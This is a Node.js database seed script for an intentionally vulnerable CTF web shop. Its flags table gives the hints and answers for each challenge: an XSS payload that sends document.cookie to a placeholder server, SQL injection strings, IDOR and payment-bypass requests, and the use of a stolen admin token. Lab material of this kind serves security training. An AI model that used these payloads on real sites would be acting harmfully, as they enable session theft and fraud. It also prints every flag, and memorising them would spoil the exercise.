const { getDb, initTables } = require('./init');

const db = getDb();

db.exec('DROP TABLE IF EXISTS order_items');
db.exec('DROP TABLE IF EXISTS reviews');
db.exec('DROP TABLE IF EXISTS orders');
db.exec('DROP TABLE IF EXISTS products');
db.exec('DROP TABLE IF EXISTS users');
db.exec('DROP TABLE IF EXISTS flags');
// Drop the old ones just in case
db.exec('DROP TABLE IF EXISTS villains');

initTables(db);

// ═══════════════════════════════════════
//  USERS (Collectors)
// ═══════════════════════════════════════
const insertUser = db.prepare(`
  INSERT INTO users (username, password, display_name, role, bio, session_token)
  VALUES (?, ?, ?, ?, ?, ?)
`);

const users = [
  ['bugdrop_admin', 'password123', 'Admin', 'admin',
    'Lead designer at Bugdrop. I know where the molds are kept.',
    'admin-token-super-secreto-12345'],
  ['minion_42', 'esbirro2024', 'Collector #42', 'collector',
    'Verified Buyer. Has 14 complete sets.',
    null],
  ['lady_caos', 'chaos666', 'Lady Caos', 'collector',
    'Early Adopter. Keeps everything in mint condition.',
    null],
  ['prof_doom', 'doom1234', 'Prof. Doom', 'collector',
    'Bulk Buyer. Buys out stock every drop.',
    null],
  ['hacker_fantasma', 'ghost_in_shell', 'The Ghost', 'collector',
    'Anonymous Collector. Ships to a PO Box.',
    null],
];

for (const u of users) {
  insertUser.run(...u);
}

// ═══════════════════════════════════════
//  PRODUCTOS
// ═══════════════════════════════════════
const insertProduct = db.prepare(`
  INSERT INTO products (name, description, price, category, image_emoji, stock, featured)
  VALUES (?, ?, ?, ?, ?, ?, ?)
`);

const products = [
  ['Bug Hacker',
    'Black hoodie. RGB laptop. Coffee in hand. This Bug prefers working late at night and asking no questions. Series 01 · Common.',
    29, 'series-01', '🐛', 150, 0],
  ['Bug Aviator',
    'Aviator goggles, scarf in the wind, and the smile of someone fully in control. Series 01 · Common.',
    29, 'series-01', '🐛', 120, 0],
  ['Bug Robot',
    'Half creature, half machine. Runs on either coffee or code, we are still not sure. Series 01 · Common.',
    29, 'series-01', '🐛', 130, 0],
  ['Bug Firefighter',
    'Always ready to put out the fire... or to start one. Red helmet included. Series 01 · Common.',
    29, 'series-01', '🐛', 110, 0],
  ['Bug Astronaut',
    'Has traveled further than any other Bug. What he saw out there changed him forever. Series 01 · Rare.',
    49, 'series-01', '🐛', 60, 0],
  ['Bug Chef',
    'An 8-inch knife, leather apron, and a recipe nobody else knows. Series 01 · Common.',
    29, 'series-01', '🐛', 100, 0],
  ['Bug Detective',
    'Sees everything. Knows everything. Never tells you how. Polished magnifying glass included. Series 01 · Rare.',
    49, 'series-01', '🐛', 55, 0],
  ['Bug Scientist',
    'White lab coat, safety goggles, and three failed experiments a day. Very promising. Series 01 · Common.',
    29, 'series-01', '🐛', 115, 0],
  ['Bug Cowboy',
    'Wide-brimmed hat, silver spurs, and a stare that needs no words. Series 01 · Common.',
    29, 'series-01', '🐛', 120, 0],
  ['Bug Samurai',
    'Black lacquered armor, twin-blade katana, and a discipline the other Bugs cannot comprehend. Series 01 · Rare.',
    49, 'series-01', '🐛', 45, 0],
  ['Bug Wizard',
    'Starry cape, crystal wand, and a hat from which things emerge that are better left unquestioned. Series 01 · Rare.',
    49, 'series-01', '🐛', 50, 0],
  ['Bug ???',
    '???',
    999, 'secret', '🐛', 1, 1],
];

for (const p of products) {
  insertProduct.run(...p);
}

// ═══════════════════════════════════════
//  PEDIDOS (incluye el pedido secreto del Admin)
// ═══════════════════════════════════════
const insertOrder = db.prepare(`
  INSERT INTO orders (user_id, status, payment_status, total_price, notes)
  VALUES (?, ?, ?, ?, ?)
`);

const insertOrderItem = db.prepare(`
  INSERT INTO order_items (order_id, product_id, quantity, unit_price)
  VALUES (?, ?, ?, ?)
`);

// Pedido 1: Admin (Admin) — contiene los planos secretos (bandera IDOR)
const order1 = insertOrder.run(
  1, 'completed', 'paid', 752500000,
  '🚨 INTERNAL ONLY 🚨 Production molds for Bug ???. Factory coordinates: 47.1234°N, 172.5678°W. Access Code: FLAG{idor_leaked_factory_molds}. DO NOT SHARE OUTSIDE DESIGN TEAM.'
);
insertOrderItem.run(order1.lastInsertRowid, 12, 1, 999);

// Pedido 2: Collector #42
const order2 = insertOrder.run(
  2, 'shipped', 'paid', 58,
  'Hoping to get the Samurai one.'
);
insertOrderItem.run(order2.lastInsertRowid, 3, 2, 29);

// Pedido 3: Lady Caos
const order3 = insertOrder.run(
  3, 'pending', 'paid', 49,
  'Please pack with extra bubble wrap, keeping it sealed in box.'
);
insertOrderItem.run(order3.lastInsertRowid, 5, 1, 49);

// Pedido 4: Prof. Doom
const order4 = insertOrder.run(
  4, 'pending', 'pending', 12340000,
  'Note: I am buying out the whole stock.'
);
insertOrderItem.run(order4.lastInsertRowid, 8, 100, 29);


// ═══════════════════════════════════════
//  RESEÑAS
// ═══════════════════════════════════════
const insertReview = db.prepare(`
  INSERT INTO reviews (user_id, product_id, content, rating)
  VALUES (?, ?, ?, ?)
`);

const reviews = [
  [2, 1, 'The paint job on the hoodie is amazing. Fits perfectly with my desk setup. 5/5', 5],
  [3, 2, 'The box was slightly dented when it arrived. The figure is cool though.', 3],
  [4, 5, 'Bought 10 boxes trying to get the Secret. Got 4 Astronauts instead. Nice detail.', 4],
  [2, 6, 'Love the little chef hat! The clay texture is incredible.', 5],
  [5, 10, 'The Samurai sword arrived bent. I had to heat it up to fix it.', 2],
];

for (const r of reviews) {
  insertReview.run(...r);
}

// ═══════════════════════════════════════
//  BANDERAS CTF + PISTAS
// ═══════════════════════════════════════
const insertFlag = db.prepare(`
  INSERT INTO flags (challenge_key, flag_value, title, description, difficulty, hints_level1, hints_level2)
  VALUES (?, ?, ?, ?, ?, ?, ?)
`);

const flags = [
  ['cart_manipulation',
    'FLAG{free_drop_cart_manipulation}',
    'Free Drop (Cart Manipulation)',
    'Acquire the Secret Bug ($999) for $0 or less.',
    'easy',
    'Prices should not be decided on the client side... What if the server blindly trusts what you send?',
    'Intercept the POST /api/cart/checkout request with Burp Suite or DevTools. Find the "unit_price" in the JSON body and change it to 0.'],
  ['stored_xss',
    'FLAG{xss_collector_stolen_session}',
    'Stolen Session (Stored XSS)',
    'Steal the admin cookie (Admin) by injecting code into the product reviews.',
    'medium',
    'Product reviews are rendered without sanitization. What if you write something that is not just plain text?',
    'Write a review with a payload like <script>document.location="http://your-server?c="+document.cookie</script> or just execute alert() with document.cookie.'],
  ['idor_orders',
    'FLAG{idor_leaked_factory_molds}',
    'Leaked Molds (IDOR)',
    'Read order #1 belonging to Admin containing the factory molds coordinates.',
    'easy',
    'When checking your own collection/orders, the URL has a numeric ID. Does the server verify that order belongs to you?',
    'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see Admin data.'],
  ['payment_bypass',
    'FLAG{payment_bypass_vip_collector}',
    'Payment Bypass',
    'Complete a purchase without paying by manipulating the payment status.',
    'medium',
    'The payment system trusts the client about the transaction result. Who actually validates if you paid?',
    'Intercept the POST /api/orders/:id/pay request. The server accepts a JSON with {"status": "success"} without verifying with any payment processor. Send it directly.'],
  ['sqli_newsletter',
    'FLAG{sqli_newsletter_admin_coupon}',
    'Newsletter SQLi',
    'Steal the admin exclusive coupon via the newsletter subscription form.',
    'easy',
    'The newsletter input is raw concatenated into the SQL query.',
    "Try putting `bugdrop_admin'--` or `admin' OR '1'='1` in the email input. Because the frontend uses type='text' instead of 'email', you can bypass HTML validation easily."],
  ['admin_panel',
    'FLAG{the_creator_secret_panel}',
    'Admin (Admin Panel)',
    'Access the secret administrator dashboard using a stolen session.',
    'hard',
    'Where do admins usually log in or view internal data? Look for hidden routes like /admin or /admin.',
    'Use the JWT token stolen from the Stored XSS challenge. Set it in your browser localStorage as "bugdrop_token" and navigate to /admin.'],
];

for (const f of flags) {
  insertFlag.run(...f);
}

console.log(`
╔══════════════════════════════════════════════════╗
║  📦 Bugdrop Database Seeded Successfully         ║
╠══════════════════════════════════════════════════╣
║  Users:      ${users.length}                                   ║
║  Products:   ${products.length}                                  ║
║  Orders:     4                                   ║
║  Reviews:    ${reviews.length}                                   ║
║  Flags:      ${flags.length}                                   ║
╠══════════════════════════════════════════════════╣
║  🎯 CTF Flags:                                   ║
║  1. FLAG{free_drop_cart_manipulation}            ║
║  2. FLAG{xss_collector_stolen_session}           ║
║  3. FLAG{idor_leaked_factory_molds}              ║
║  4. FLAG{payment_bypass_vip_collector}           ║
║  5. FLAG{sqli_newsletter_admin_coupon}           ║
║  6. FLAG{the_creator_secret_panel}               ║
╚══════════════════════════════════════════════════╝
`);

db.close();
